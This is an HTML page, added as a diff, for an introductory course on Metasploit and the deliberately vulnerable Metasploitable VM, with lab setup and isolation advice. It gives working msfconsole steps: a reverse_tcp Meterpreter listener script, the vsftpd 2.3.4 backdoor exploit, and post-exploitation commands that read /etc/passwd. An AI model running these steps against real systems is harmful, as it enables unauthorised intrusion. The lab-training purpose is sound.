@@ -1,0 +1,332 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Course Content — Metasploit & Metasploitable (Practical Intro)</title>
+  <!-- Strict, local-only CSP; no external loads, no eval -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'; connect-src 'none'">
+  <style>
+    :root{--bg:#0f1724;--panel:#0b1220;--text:#e6eef8;--muted:#9fb0c9;--accent:#89f0c3;--border:rgba(255,255,255,0.08)}
+    [data-theme="light"]{--bg:#f8fafc;--panel:#ffffff;--text:#0b1220;--muted:#4b5563;--accent:#0ea5a4;--border:rgba(0,0,0,0.12)}
+    *{box-sizing:border-box}
+    body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,Segoe UI,system-ui,Arial,sans-serif;line-height:1.5}
+    header{display:flex;gap:16px;align-items:center;justify-content:space-between;padding:16px 20px;border-bottom:1px solid var(--border);background:linear-gradient(90deg,rgba(255,255,255,0.04),transparent)}
+    h1{font-size:1.2rem;margin:0}
+    .muted{color:var(--muted)}
+    .wrap{display:grid;grid-template-columns:280px 1fr;gap:20px;padding:20px}
+    nav{background:var(--panel);padding:12px;border-radius:12px;border:1px solid var(--border);height:calc(100vh - 120px);overflow:auto;position:sticky;top:20px}
+    main{background:var(--panel);padding:20px;border-radius:12px;border:1px solid var(--border);min-height:60vh}
+    ul.nav{list-style:none;margin:8px 0 0 0;padding:0}
+    ul.nav li{margin-bottom:6px}
+    ul.nav button{width:100%;text-align:left;border:1px solid var(--border);background:transparent;color:var(--text);padding:8px 10px;border-radius:8px;cursor:pointer}
+    .controls{display:flex;gap:8px}
+    button.ctrl{border:1px solid var(--border);background:transparent;color:var(--text);padding:8px 10px;border-radius:8px;cursor:pointer}
+    section.chapter{border:1px solid var(--border);border-radius:10px;margin-bottom:16px}
+    section.chapter>details[open]>summary{border-bottom:1px solid var(--border)}
+    summary{list-style:none;padding:12px 14px;cursor:pointer;display:flex;align-items:center;justify-content:space-between}
+    .grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+    .step{border:1px dashed var(--border);border-radius:10px;padding:12px;margin:10px 0}
+    .kbd{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;background:rgba(255,255,255,0.06);padding:0 6px;border-radius:6px;color:var(--text)}
+    .code{position:relative;margin:8px 0;border:1px solid var(--border);border-radius:8px;overflow:auto}
+    .code pre{margin:0;padding:12px;white-space:pre-wrap;word-break:break-word}
+    .copy{position:absolute;top:6px;right:6px;border:1px solid var(--border);background:transparent;color:var(--text);border-radius:6px;padding:6px 8px;cursor:pointer}
+    .callout{border-left:4px solid var(--accent);background:rgba(137,240,195,0.08);padding:10px;border-radius:6px;margin:10px 0}
+    .badge{display:inline-block;border:1px solid var(--border);padding:2px 8px;border-radius:999px;font-size:12px}
+    figure{margin:12px 0;text-align:center}
+    figcaption{font-size:0.9rem}
+    .pill{display:inline-block;padding:2px 8px;border-radius:999px;border:1px solid var(--border);font-size:12px}
+    @media (max-width:1000px){.wrap{grid-template-columns:1fr}.grid{grid-template-columns:1fr}}
+  </style>
+</head>
+<body data-theme="dark">
+  <header>
+    <div>
+      <h1>Metasploit &amp; Metasploitable — Practical Introduction</h1>
+      <div class="muted">Full course content with hands-on guidance and secure, offline-friendly UI</div>
+    </div>
+    <div class="controls">
+      <button class="ctrl" id="toggleTheme" title="Toggle dark/light">Toggle theme</button>
+      <button class="ctrl" id="expandAll" title="Expand all sections">Expand all</button>
+      <button class="ctrl" id="collapseAll" title="Collapse all sections">Collapse all</button>
+      <input id="search" type="search" placeholder="Search topics" aria-label="Search" style="border:1px solid var(--border);background:transparent;color:var(--text);padding:8px 10px;border-radius:8px;width:220px" />
+    </div>
+  </header>
+
+  <div class="wrap">
+    <nav id="sideNav" aria-label="Navigation">
+      <div class="muted" style="margin-bottom:6px">Chapters</div>
+      <ul class="nav" id="navList">
+        <li><button data-target="ch0">Overview (45+ minutes)</button></li>
+        <li><button data-target="ch1">I. Metasploit Framework (25+ min)</button></li>
+        <li><button data-target="ch2">II. Metasploitable Target (20+ min)</button></li>
+        <li><button data-target="ch3">III. Workflow: Recon → Exploit → Post</button></li>
+        <li><button data-target="ch4">IV. Variants & Other Vulnerable VMs</button></li>
+      </ul>
+      <hr style="border:none;border-top:1px solid var(--border);margin:12px 0">
+      <div class="muted">Quick Links</div>
+      <ul class="nav">
+        <li><button data-target="ch1-modules">Metasploit Modules</button></li>
+        <li><button data-target="ch1-msfconsole">msfconsole Commands</button></li>
+        <li><button data-target="ch1-rc">Resource Scripts (.rc)</button></li>
+        <li><button data-target="ch1-setup">Kali VM & Setup</button></li>
+        <li><button data-target="ch2-network">Network Isolation</button></li>
+        <li><button data-target="ch3-nmap">Nmap Commands</button></li>
+        <li><button data-target="ch3-exploit">Exploit: vsftpd 2.3.4</button></li>
+      </ul>
+    </nav>
+
+    <main id="content">
+      <!-- Overview -->
+      <section id="ch0" class="chapter">
+        <details open>
+          <summary><strong>Overview</strong> <span class="badge">Scope & Learning Goals</span></summary>
+          <div style="padding:12px">
+            <p>This module introduces two essential lab assets: the <strong>Metasploit Framework</strong> (offensive testing and research platform) and <strong>Metasploitable</strong> (a deliberately vulnerable VM). You will learn purpose, architecture, installation, and a full practice workflow from recon to post‑exploitation.</p>
+            <div class="callout"><strong>Ethics & Safety:</strong> Only attack systems you own or have explicit written permission to test. Use host‑only lab networks. Document everything you do.</div>
+          </div>
+        </details>
+      </section>
+
+      <!-- I. Metasploit Framework -->
+      <section id="ch1" class="chapter">
+        <details>
+          <summary><strong>I. Metasploit Framework: The Penetration Tester's Swiss Army Knife</strong> <span class="badge">25+ minutes</span></summary>
+          <div style="padding:12px">
+            <h3>What is Metasploit?</h3>
+            <p>The Metasploit Framework is an open-source penetration testing and exploitation tool used to develop, test, and execute exploit code against remote targets. It supports both offensive (pentesting) and defensive (research, awareness) use.</p>
+
+            <h3 id="ch1-modules">How Metasploit Works — Modular Architecture</h3>
+            <ul>
+              <li><strong>Exploits</strong>: code to trigger specific vulnerabilities</li>
+              <li><strong>Payloads</strong>: actions after exploitation (e.g., reverse shell, Meterpreter)</li>
+              <li><strong>Auxiliary</strong>: scanners, fuzzers, recon tools</li>
+              <li><strong>Encoders</strong>: obfuscate payloads to evade AV/IDS</li>
+              <li><strong>Post</strong>: privilege escalation, persistence, data exfil, pivot</li>
+            </ul>
+            <div class="callout">Typical sequence: Recon → Vulnerability analysis → Select exploit → Set options → Choose payload → Run exploit.</div>
+
+            <div class="grid">
+              <div>
+                <h3 id="ch1-msfconsole">Key Components & Usage (msfconsole)</h3>
+                <p><span class="pill">msfconsole</span> is the primary CLI interface.</p>
+                <ul>
+                  <li><strong>Exploits</strong>: e.g., <span class="kbd">exploit/windows/smb/ms17_010_eternalblue</span></li>
+                  <li><strong>Payloads</strong>: e.g., <span class="kbd">windows/meterpreter/reverse_tcp</span></li>
+                  <li><strong>Auxiliary</strong>: e.g., <span class="kbd">auxiliary/scanner/portscan/tcp</span></li>
+                  <li><strong>Post</strong>: e.g., <span class="kbd">post/windows/gather/enum_logged_on_users</span></li>
+                </ul>
+              </div>
+              <div>
+                <figure>
+                  <figcaption class="muted">Metasploit workflow (schematic)</figcaption>
+                  <svg viewBox="0 0 720 120" xmlns="http://www.w3.org/2000/svg" style="max-width:100%;height:auto">
+                    <defs><marker id="ar" markerWidth="10" markerHeight="10" refX="5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L0,6 L9,3 z" fill="currentColor"/></marker></defs>
+                    <g fill="none" stroke="currentColor" stroke-width="1.5">
+                      <rect x="20" y="30" width="160" height="60" rx="8"/><rect x="220" y="30" width="160" height="60" rx="8"/><rect x="420" y="30" width="160" height="60" rx="8"/><rect x="620" y="30" width="80" height="60" rx="8"/>
+                      <line x1="180" y1="60" x2="220" y2="60" marker-end="url(#ar)"/><line x1="380" y1="60" x2="420" y2="60" marker-end="url(#ar)"/><line x1="580" y1="60" x2="620" y2="60" marker-end="url(#ar)"/>
+                    </g>
+                    <g font-family="sans-serif" font-size="13" fill="currentColor">
+                      <text x="100" y="65" text-anchor="middle">Recon</text>
+                      <text x="300" y="65" text-anchor="middle">Select Exploit</text>
+                      <text x="500" y="65" text-anchor="middle">Set Options</text>
+                      <text x="660" y="65" text-anchor="middle">Exploit</text>
+                    </g>
+                  </svg>
+                </figure>
+              </div>
+            </div>
+
+            <h3>Common msfconsole Commands (workflow)</h3>
+            <div class="code"><button class="copy" data-copy>Copy</button><pre>search &lt;keyword&gt;            # find modules (by name, CVE, type)
+info &lt;module_path&gt;         # details, options, targets, refs
+use &lt;module_path&gt;          # select module
+show options               # module options (RHOSTS, RPORT, LHOST, LPORT)
+show payloads              # compatible payloads
+show targets               # valid targets/architectures
+set &lt;OPT&gt; &lt;VAL&gt;            # set module option
+setg &lt;OPT&gt; &lt;VAL&gt;           # set global option
+run / exploit              # execute current module
+check                      # vulnerability check (if supported)
+sessions -l                # list sessions
+sessions -i &lt;id&gt;           # interact with a session
+background                 # background current session
+save                       # persist global options
+exit                       # quit msfconsole</pre></div>
+
+            <h3 id="ch1-rc">Automation with Resource Scripts (.rc)</h3>
+            <p>Automate repetitive actions by placing msfconsole commands in a <span class="kbd">.rc</span> file and using <span class="kbd">resource</span>.</p>
+            <div class="code"><button class="copy" data-copy>Copy</button><pre># my_listener.rc
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+exploit -j</pre></div>
+
+            <h3 id="ch1-setup">Installation & Basic Setup (Kali VM)</h3>
+            <ol>
+              <li><strong>Kali VM</strong>: download ISO or prebuilt VM; allocate ~4 GB RAM, 2 vCPU, 20–30 GB disk.</li>
+              <li><strong>Update</strong>:
+                <div class="code"><button class="copy" data-copy>Copy</button><pre>$ sudo apt update && sudo apt upgrade -y</pre></div>
+              </li>
+              <li><strong>Metasploit DB</strong>:
+                <div class="code"><button class="copy" data-copy>Copy</button><pre>$ msfdb init
+$ msfdb start
+$ msfdb status</pre></div>
+              </li>
+              <li><strong>Launch</strong>:
+                <div class="code"><button class="copy" data-copy>Copy</button><pre>$ msfconsole</pre></div>
+              </li>
+              <li><strong>Update Framework</strong>:
+                <div class="code"><button class="copy" data-copy>Copy</button><pre>msf6&gt; msfupdate</pre></div>
+              </li>
+            </ol>
+          </div>
+        </details>
+      </section>
+
+      <!-- II. Metasploitable -->
+      <section id="ch2" class="chapter">
+        <details>
+          <summary><strong>II. Metasploitable: The Vulnerable Target</strong> <span class="badge">20+ minutes</span></summary>
+          <div style="padding:12px">
+            <h3>Purpose</h3>
+            <p>Metasploitable is a deliberately vulnerable Linux VM for safe, ethical practice of exploitation techniques without risking real systems.</p>
+
+            <h3>How it Works — Categories of Weaknesses</h3>
+            <ul>
+              <li><strong>Web app vulns</strong>: SQLi, XSS, RFI/LFI, insecure upload, weak auth</li>
+              <li><strong>Service vulns</strong>: FTP, SSH, Samba, DBs, Tomcat defaults</li>
+              <li><strong>OS issues</strong>: weak creds, unpatched software, bad permissions</li>
+            </ul>
+
+            <h3>Setup (OVA import)</h3>
+            <ol>
+              <li>Download <strong>Metasploitable2</strong> OVA (beginner‑friendly) or prepare Metasploitable3 (advanced).</li>
+              <li>Import appliance in VirtualBox/VMware and adjust RAM (~1 GB), CPU (1 core).</li>
+            </ol>
+
+            <h3 id="ch2-network">Crucial Network Isolation</h3>
+            <ul>
+              <li><strong>Host‑Only</strong> (recommended): isolated lab network between host and VMs.</li>
+              <li><strong>NAT</strong>: limited internet egress; safer than Bridged.</li>
+              <li><strong>Bridged</strong>: <em>avoid</em> on home/production networks; exposes vulnerable VM.</li>
+            </ul>
+            <div class="step"><strong>VirtualBox example</strong>: Settings → Network → Adapter 1 → Host‑Only Adapter (e.g., vboxnet0). Put Kali on the same host‑only network.</div>
+
+            <h3>Initial Boot & Login</h3>
+            <div class="code"><button class="copy" data-copy>Copy</button><pre>Username: msfadmin
+Password: msfadmin</pre></div>
+            <div class="code"><button class="copy" data-copy>Copy</button><pre>$ ifconfig   # find target IP on host-only network (e.g., 192.168.56.101)</pre></div>
+          </div>
+        </details>
+      </section>
+
+      <!-- III. Workflow -->
+      <section id="ch3" class="chapter">
+        <details>
+          <summary><strong>III. Practical Workflow: Recon → Exploit → Post</strong> <span class="badge">Hands‑on</span></summary>
+          <div style="padding:12px">
+            <h3 id="ch3-nmap">Recon with Nmap (from Kali)</h3>
+            <div class="code"><button class="copy" data-copy>Copy</button><pre>$ nmap -sV 192.168.56.101      # service version detection
+$ nmap -p- 192.168.56.101      # all TCP ports
+$ nmap -sC -sV 192.168.56.101  # default scripts + versions</pre></div>
+
+            <h3>Research & Module Selection</h3>
+            <div class="code"><button class="copy" data-copy>Copy</button><pre>msf6&gt; search vsftpd 2.3.4
+msf6&gt; info exploit/unix/ftp/vsftpd_234_backdoor</pre></div>
+
+            <h3 id="ch3-exploit">Exploit Example — vsftpd 2.3.4 Backdoor</h3>
+            <div class="code"><button class="copy" data-copy>Copy</button><pre>msf6&gt; use exploit/unix/ftp/vsftpd_234_backdoor
+msf6&gt; show options
+msf6&gt; set RHOSTS 192.168.56.101
+msf6&gt; set PAYLOAD cmd/unix/interact
+msf6&gt; run</pre></div>
+            <div class="callout">If successful, you obtain a shell on Metasploitable. Proceed with care and document actions.</div>
+
+            <h3>Post‑Exploitation Basics</h3>
+            <div class="code"><button class="copy" data-copy>Copy</button><pre>$ whoami
+$ uname -a
+$ cat /etc/passwd</pre></div>
+            <p>Upgrade or manage sessions via Metasploit:</p>
+            <div class="code"><button class="copy" data-copy>Copy</button><pre>msf6&gt; sessions -l
+msf6&gt; sessions -i &lt;id&gt;
+msf6&gt; background</pre></div>
+          </div>
+        </details>
+      </section>
+
+      <!-- IV. Variants & other VMs -->
+      <section id="ch4" class="chapter">
+        <details>
+          <summary><strong>IV. Variants & Complementary Vulnerable VMs</strong> <span class="badge">Further Study</span></summary>
+          <div style="padding:12px">
+            <ul>
+              <li><strong>Metasploitable2</strong>: broad, beginner‑friendly lab (DVWA, Mutillidae, WebGoat options)</li>
+              <li><strong>Metasploitable3</strong>: Windows Server & Ubuntu builds via Vagrant/Packer; more realistic</li>
+              <li><strong>OWASP BWA</strong>: bundle of purposely vulnerable web apps</li>
+              <li><strong>DVWA</strong>: configurable PHP/MySQL target with levels (low→impossible)</li>
+              <li><strong>VulnHub</strong>: community CTF‑style VMs across difficulties and technologies</li>
+            </ul>
+            <div class="callout">Choose targets by learning goal: web vulns (OWASP BWA/DVWA), modern OS realism (Metasploitable3), or CTF progression (VulnHub).</div>
+          </div>
+        </details>
+      </section>
+
+    </main>
+  </div>
+
+  <footer style="padding:12px 20px;color:var(--muted);text-align:right">Local‑only, secure UI. No external resources loaded.</footer>
+
+  <script>
+    (function(){
+      const body = document.body;
+      const q = s=>document.querySelector(s);
+      const qa = s=>Array.from(document.querySelectorAll(s));
+
+      // Theme toggle
+      q('#toggleTheme').addEventListener('click', ()=>{
+        body.setAttribute('data-theme', body.getAttribute('data-theme')==='light'?'dark':'light');
+      });
+
+      // Expand/Collapse all
+      q('#expandAll').addEventListener('click', ()=> qa('main details').forEach(d=>d.open=true));
+      q('#collapseAll').addEventListener('click', ()=> qa('main details').forEach(d=>d.open=false));
+
+      // Side navigation
+      q('#sideNav').addEventListener('click', (e)=>{
+        const btn = e.target.closest('button');
+        if(!btn) return;
+        const id = btn.getAttribute('data-target');
+        if(!id) return;
+        const el = q('#'+id); if(!el) return;
+        el.scrollIntoView({behavior:'smooth', block:'start'});
+        const det = el.querySelector('details'); if(det) det.open = true;
+      });
+
+      // Search filter
+      q('#search').addEventListener('input', (e)=>{
+        const term = (e.target.value||'').trim().toLowerCase();
+        qa('main section').forEach(sec=>{
+          const txt = sec.textContent.toLowerCase();
+          sec.style.display = !term || txt.includes(term) ? 'block' : 'none';
+        });
+      });
+
+      // Copy buttons
+      document.addEventListener('click', (e)=>{
+        const b = e.target.closest('[data-copy]');
+        if(!b) return;
+        const pre = b.parentElement.querySelector('pre');
+        if(!pre) return;
+        const text = pre.textContent;
+        navigator.clipboard.writeText(text).then(()=>{
+          const old = b.textContent; b.textContent = 'Copied';
+          setTimeout(()=>{ b.textContent = old || 'Copy'; }, 900);
+        }).catch(()=>{});
+      });
+    })();
+  </script>
+</body>
+</html>
